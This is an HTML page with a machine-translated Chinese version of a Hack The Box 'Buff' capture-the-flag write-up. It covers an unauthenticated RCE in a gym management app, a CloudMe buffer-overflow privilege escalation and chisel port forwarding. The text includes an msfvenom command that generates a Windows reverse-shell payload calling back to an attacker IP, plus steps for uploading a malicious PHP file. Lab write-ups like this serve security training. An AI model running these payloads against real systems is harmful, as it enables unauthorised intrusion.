<html>
<head>
<title>HTB Buff [writeup]</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HTB迷[评论]</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/htb-buff-writeup-5d118ab695c0?source=collection_archive---------1-----------------------#2020-11-21">https://infosecwriteups.com/htb-buff-writeup-5d118ab695c0?source=collection_archive---------1-----------------------#2020-11-21</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="e15e" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">未经验证的RCE |缓冲区利用|端口转发</h2></div><figure class="kj kk kl km gt kn gh gi paragraph-image"><div class="gh gi ki"><img src="../Images/136e63f5d49b8cfdff5b524440eb150a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1134/format:webp/1*Ng7fAldsQsxhEQ-ZpywHkA.png"/></div></figure><h1 id="97d1" class="kq kr it bd ks kt ku kv kw kx ky kz la jz lb ka lc kc ld kd le kf lf kg lg lh bi translated">摘要</h1><p id="4ecb" class="pw-post-body-paragraph li lj it lk b ll lm ju ln lo lp jx lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">这台机器教你如何利用一个简单的应用程序，容易受到未经认证的RCE获得用户外壳。对于根攻击，需要修改缓冲区攻击代码和端口转发技术。</p><p id="cba9" class="pw-post-body-paragraph li lj it lk b ll me ju ln lo mf jx lq lr mg lt lu lv mh lx ly lz mi mb mc md im bi translated"><strong class="lk iu">使用的工具:</strong> <code class="fe mj mk ml mm b">nmap</code> | <code class="fe mj mk ml mm b">curl</code> | <code class="fe mj mk ml mm b">nc</code> | <code class="fe mj mk ml mm b">chisel</code></p></div><div class="ab cl mn mo hx mp" role="separator"><span class="mq bw bk mr ms mt"/><span class="mq bw bk mr ms mt"/><span class="mq bw bk mr ms"/></div><div class="im in io ip iq"><h1 id="bc50" class="kq kr it bd ks kt mu kv kw kx mv kz la jz mw ka lc kc mx kd le kf my kg lg lh bi translated">侦察和计数</h1><p id="aa30" class="pw-post-body-paragraph li lj it lk b ll lm ju ln lo lp jx lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated"><strong class="lk iu"> Nmap TCP扫描输出</strong></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi mz"><img src="../Images/a9046902f9edb9a34557f19083d2df73.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Svd0FVHZ2594-Q8nheG5dQ.png"/></div></div></figure></div><div class="ab cl mn mo hx mp" role="separator"><span class="mq bw bk mr ms mt"/><span class="mq bw bk mr ms mt"/><span class="mq bw bk mr ms"/></div><div class="im in io ip iq"><h1 id="8ff8" class="kq kr it bd ks kt mu kv kw kx mv kz la jz mw ka lc kc mx kd le kf my kg lg lh bi translated">据点</h1><p id="4be7" class="pw-post-body-paragraph li lj it lk b ll lm ju ln lo lp jx lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated"><strong class="lk iu"> ******************端口8080 HTTP * * * * * * * * * * * * * * * * * * * * * * * * * * * *</strong></p><p id="6460" class="pw-post-body-paragraph li lj it lk b ll me ju ln lo mf jx lq lr mg lt lu lv mh lx ly lz mi mb mc md im bi translated">在<em class="ne"> /contact.php </em>下，我们可以看到它可能是用户名。</p><p id="80a6" class="pw-post-body-paragraph li lj it lk b ll me ju ln lo mf jx lq lr mg lt lu lv mh lx ly lz mi mb mc md im bi translated">web应用程序正在运行健身房管理软件v1.0，该软件易受<a class="ae nf" href="https://www.exploit-db.com/exploits/48506" rel="noopener ugc nofollow" target="_blank">远程代码执行(RCE) </a>攻击。该漏洞通过将恶意php文件上传到/upload.php来绕过图像上传过滤器。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div class="gh gi ng"><img src="../Images/c71c5bd50fb358146fa3bf5afa57d5d7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1320/format:webp/1*Y5BQ0bykCpcR9-nTHjIGfg.png"/></div></figure><h1 id="0f9f" class="kq kr it bd ks kt ku kv kw kx ky kz la jz lb ka lc kc ld kd le kf lf kg lg lh bi translated">反向外壳</h1><p id="e2aa" class="pw-post-body-paragraph li lj it lk b ll lm ju ln lo lp jx lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">在下载了漏洞代码并试图执行它之后，我得到了以下错误。然而，它只需要简单的修复:</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi nh"><img src="../Images/656db57c07b51a6493bf06e02ba9b03d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sjQolcCRrMsZhfm_QxUi6w.png"/></div></div><figcaption class="ni nj gj gh gi nk nl bd b be z dk translated">错误I</figcaption></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi nm"><img src="../Images/bde145e9d04888ef09e520d3c776dd38.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*I_gGKHW8Ieej9gj53bgGNw.png"/></div></div><figcaption class="ni nj gj gh gi nk nl bd b be z dk translated">修复I</figcaption></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi nn"><img src="../Images/94f33a4fd42ec44e1fbf84e5a8fc1f1b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pYuxGSdDhdEaaQP8Zg5ZZg.png"/></div></div><figcaption class="ni nj gj gh gi nk nl bd b be z dk translated">错误二</figcaption></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi no"><img src="../Images/10ebc21b6b1084b593b9d28a908fb522.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7ZeGsa1QZnuMSnXpac_jUw.png"/></div></div><figcaption class="ni nj gj gh gi nk nl bd b be z dk translated">修复II</figcaption></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi np"><img src="../Images/dbedb091fcfeb354bbb75d7625cc030a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*X8v8UrFxXOhvCz-Ny6lLuQ.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi nq"><img src="../Images/7584d4415d1df231a26752ed5e73763c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gEjqSZc3U7UTcBOW6zuKcw.png"/></div></div></figure><h1 id="c9b4" class="kq kr it bd ks kt ku kv kw kx ky kz la jz lb ka lc kc ld kd le kf lf kg lg lh bi translated">横向运动</h1><p id="6d9e" class="pw-post-body-paragraph li lj it lk b ll lm ju ln lo lp jx lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">弹出一个窗口外壳后，总是尝试执行<strong class="lk iu">powershell.exe</strong>，因为它允许你运行更强大的命令。</p><p id="313e" class="pw-post-body-paragraph li lj it lk b ll me ju ln lo mf jx lq lr mg lt lu lv mh lx ly lz mi mb mc md im bi translated">不过，对于这台机器，在下载文件夹中找到了一个名为<strong class="lk iu"> CloudMe_1112.exe </strong>的可执行文件。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi nr"><img src="../Images/f4289e70e76d963c9e4e06dd0c58c4c5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*B8O0AHAl1FotALDJH4T8TQ.png"/></div></div></figure><h1 id="1905" class="kq kr it bd ks kt ku kv kw kx ky kz la jz lb ka lc kc ld kd le kf lf kg lg lh bi translated">权限提升</h1><p id="23bb" class="pw-post-body-paragraph li lj it lk b ll lm ju ln lo lp jx lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">【CloudMe.exe剥削T21】1 . 11 . 2</p><p id="a23d" class="pw-post-body-paragraph li lj it lk b ll me ju ln lo mf jx lq lr mg lt lu lv mh lx ly lz mi mb mc md im bi translated">CloudMe 1.11.2程序容易受到<strong class="lk iu">缓冲区溢出</strong>的攻击。以这个<a class="ae nf" href="https://www.exploit-db.com/exploits/48389" rel="noopener ugc nofollow" target="_blank">漏洞利用</a>为指导，我利用这台机器来获得root。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi ns"><img src="../Images/b6a103a1456474e39d17f8c7e593cb24.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WDNW1WJICbJoHhSb-rO9Tw.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi nt"><img src="../Images/92df63892ea13f8a1f58fd055c99e66b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VfUBb2DJ93G8lo-qeiQulw.png"/></div></div></figure><p id="debe" class="pw-post-body-paragraph li lj it lk b ll me ju ln lo mf jx lq lr mg lt lu lv mh lx ly lz mi mb mc md im bi translated">要检查<em class="ne"> CloudMe </em>是否已经在运行，运行<code class="fe mj mk ml mm b">tasklist</code> <em class="ne"> </em>命令查看正在运行的进程。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi nu"><img src="../Images/8d494c3ec79979213561ac7036749be9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jRoO-UjZV2gep4bDwMtPxw.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi nv"><img src="../Images/a9934fc2105394766f7b3fbbcff47465.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CngqjQkptsCt6geIVi9FQA.png"/></div></div></figure><p id="8454" class="pw-post-body-paragraph li lj it lk b ll me ju ln lo mf jx lq lr mg lt lu lv mh lx ly lz mi mb mc md im bi translated">下面我们可以看到CloudMe正在本地主机上运行。在执行<code class="fe mj mk ml mm b">netstat -antp tcp </code>命令时，我们还可以看到localhost上运行着两个端口:3306和8888。在google上快速搜索cloudme端口，我们发现它运行在端口8888上。因此，我们现在知道<strong class="lk iu"> CloudMe </strong>正在监听<strong class="lk iu"> 127.0.0.1:8888。</strong></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi nw"><img src="../Images/685b194adca26f689ece614ca19b828e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hSjq3FrJjvRe3kILEq6Yyg.png"/></div></div></figure><p id="411c" class="pw-post-body-paragraph li lj it lk b ll me ju ln lo mf jx lq lr mg lt lu lv mh lx ly lz mi mb mc md im bi translated">以下是该漏洞的有效载荷。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi nx"><img src="../Images/c02bf849bd89a3e0d6232500043d798c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JXhug5JdErs_MuZ9Ho2UgA.png"/></div></div></figure><p id="fe64" class="pw-post-body-paragraph li lj it lk b ll me ju ln lo mf jx lq lr mg lt lu lv mh lx ly lz mi mb mc md im bi translated">使用下面的代码修改漏洞利用代码中的当前外壳代码，并通过运行以下命令将其转换为外壳代码:</p><p id="c5c6" class="pw-post-body-paragraph li lj it lk b ll me ju ln lo mf jx lq lr mg lt lu lv mh lx ly lz mi mb mc md im bi translated"><code class="fe mj mk ml mm b">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.35 LPORT=8700 -f py -v payload</code></p><p id="ce84" class="pw-post-body-paragraph li lj it lk b ll me ju ln lo mf jx lq lr mg lt lu lv mh lx ly lz mi mb mc md im bi translated">将上面的exploit.py有效负载替换为我们的localhost和执行shell的端口。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi ny"><img src="../Images/e02e80adafe181f6b96ff2fe25764158.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Kvp1el5DwxlHEIZjk4GIAA.png"/></div></div></figure><h2 id="b339" class="nz kr it bd ks oa ob dn kw oc od dp la lr oe of lc lv og oh le lz oi oj lg ok bi translated">端口转发</h2><p id="27df" class="pw-post-body-paragraph li lj it lk b ll lm ju ln lo lp jx lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">受害者机器在本地主机8888上运行cloudme.exe，我们希望该端口在攻击者的机器上运行。</p><p id="82ff" class="pw-post-body-paragraph li lj it lk b ll me ju ln lo mf jx lq lr mg lt lu lv mh lx ly lz mi mb mc md im bi translated">下载客户端chisel.exe到受害者和chisel服务器监听攻击者的机器。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi ol"><img src="../Images/c022ae67e5e444a5f69d2de8a39f5e3b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RR74BW7retoOxidlaM33XQ.png"/></div></div></figure><blockquote class="om"><p id="3fef" class="on oo it bd op oq or os ot ou ov md dk translated">在攻击者的机器上启动Chisel服务器</p></blockquote><figure class="ox oy oz pa pb kn gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi ow"><img src="../Images/2d27f2c5b95d7de15292a437a18b840b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*a23kidQ-208at6M4wTH-Yw.png"/></div></div></figure><blockquote class="om"><p id="de8f" class="on oo it bd op oq or os ot ou ov md dk translated">在受害者的机器上启动Chisel客户端</p></blockquote><figure class="ox oy oz pa pb kn gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi pc"><img src="../Images/6c0ba3be070ee66156329c7b510fefd1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ARFn0WxgRPWawR5Mnnmbtg.png"/></div></div></figure><p id="0458" class="pw-post-body-paragraph li lj it lk b ll me ju ln lo mf jx lq lr mg lt lu lv mh lx ly lz mi mb mc md im bi translated">现在，在8700上启动一个监听端口，这个端口之前用于创建msfvenom有效负载。</p><p id="dfb8" class="pw-post-body-paragraph li lj it lk b ll me ju ln lo mf jx lq lr mg lt lu lv mh lx ly lz mi mb mc md im bi translated">执行修改后的exploit.py，让外壳弹出到攻击者的机器上。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi pd"><img src="../Images/c0f007aee721d6b8d8f1a8992de2986a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ya78BwrOCuI_fMhF7oFeZw.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi pe"><img src="../Images/4fe5a09238c6b6863fc3cdf06da78ea5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*N1KKJINX_vmr5YUUoon77Q.png"/></div></div><figcaption class="ni nj gj gh gi nk nl bd b be z dk translated"><strong class="bd ks">成功！！！</strong></figcaption></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div class="gh gi pf"><img src="../Images/2f7a1cc1c36a96dd6f62d554cc9543b8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1392/1*y7VKCsoQp8YqGAtl09Qjaw.gif"/></div></figure><h1 id="21c3" class="kq kr it bd ks kt ku kv kw kx ky kz la jz lb ka lc kc ld kd le kf lf kg lg lh bi translated">补救</h1><ul class=""><li id="ba6f" class="pg ph it lk b ll lm lo lp lr pi lv pj lz pk md pl pm pn po bi translated">删除任何程序是过时的，并已在互联网上可用的工作漏洞。</li></ul></div></div>    
</body>
</html>